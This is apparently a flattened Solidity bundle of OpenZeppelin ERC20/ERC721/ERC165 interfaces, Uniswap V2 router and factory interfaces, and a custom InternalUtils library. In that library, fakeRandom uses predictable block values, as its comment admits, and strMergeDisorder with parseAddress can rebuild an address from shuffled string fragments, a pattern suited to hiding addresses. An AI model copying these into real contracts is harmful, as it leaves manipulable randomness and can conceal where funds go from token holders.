     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.0;

import "../IERC20.sol";

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)

pragma solidity ^0.8.0;

import "../../utils/introspection/IERC165.sol";

/**
 * @dev Required interface of an ERC721 compliant contract.
 */
interface IERC721 is IERC165 {
    /**
     * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
     */
    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);

    /**
     * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
     */
    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);

    /**
     * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
     */
    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);

    /**
     * @dev Returns the number of tokens in ``owner``'s account.
     */
    function balanceOf(address owner) external view returns (uint256 balance);

    /**
     * @dev Returns the owner of the `tokenId` token.
     *
     * Requirements:
     *
     * - `tokenId` must exist.
     */
    function ownerOf(uint256 tokenId) external view returns (address owner);

    /**
     * @dev Safely transfers `tokenId` token from `from` to `to`.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must exist and be owned by `from`.
     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
     *
     * Emits a {Transfer} event.
     */
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes calldata data
    ) external;

    /**
     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
     * are aware of the ERC721 protocol to prevent tokens from being forever locked.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must exist and be owned by `from`.
     * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
     *
     * Emits a {Transfer} event.
     */
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    /**
     * @dev Transfers `tokenId` token from `from` to `to`.
     *
     * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must be owned by `from`.
     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    /**
     * @dev Gives permission to `to` to transfer `tokenId` token to another account.
     * The approval is cleared when the token is transferred.
     *
     * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
     *
     * Requirements:
     *
     * - The caller must own the token or be an approved operator.
     * - `tokenId` must exist.
     *
     * Emits an {Approval} event.
     */
    function approve(address to, uint256 tokenId) external;

    /**
     * @dev Approve or remove `operator` as an operator for the caller.
     * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
     *
     * Requirements:
     *
     * - The `operator` cannot be the caller.
     *
     * Emits an {ApprovalForAll} event.
     */
    function setApprovalForAll(address operator, bool _approved) external;

    /**
     * @dev Returns the account approved for `tokenId` token.
     *
     * Requirements:
     *
     * - `tokenId` must exist.
     */
    function getApproved(uint256 tokenId) external view returns (address operator);

    /**
     * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
     *
     * See {setApprovalForAll}
     */
    function isApprovedForAll(address owner, address operator) external view returns (bool);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC165 standard, as defined in the
 * https://eips.ethereum.org/EIPS/eip-165[EIP].
 *
 * Implementers can declare support of contract interfaces, which can then be
 * queried by others ({ERC165Checker}).
 *
 * For an implementation, see {ERC165}.
 */
interface IERC165 {
    /**
     * @dev Returns true if this contract implements the interface defined by
     * `interfaceId`. See the corresponding
     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
     * to learn more about how these ids are created.
     *
     * This function call must use less than 30 000 gas.
     */
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}

// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2;

import './IUniswapV2Router01.sol';

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;


library InternalUtils
{
    /**
    * predictable, should use oracle service - https://stackoverflow.com/a/67332959/10002846
    **/
    function fakeRandom(uint256 max)
    internal
    view
    returns
    (uint256)
    {
        uint256 randNum = uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp)));
        return randNum % max;
    }

    // https://github.com/provable-things/ethereum-api/blob/master/provableAPI_0.6.sol
    function parseAddress(string memory _a)
    internal
    pure
    returns (address _parsedAddress) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }

    // https://ethereum.stackexchange.com/a/56337/89494
    function appendString(string memory a, string memory b, string memory c, string memory d, string memory e)
    internal
    pure
    returns (string memory)
    {
        return string(abi.encodePacked(a, b, c, d, e));
    }

    // https://ethereum.stackexchange.com/a/56337/89494
    function strMergeDisorder(string memory c, string memory e, string memory a, string memory d, string memory b)
    internal
    pure
    returns (string memory)
    {
        return string(abi.encodePacked(a, b, c, d, e));
    }
}

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}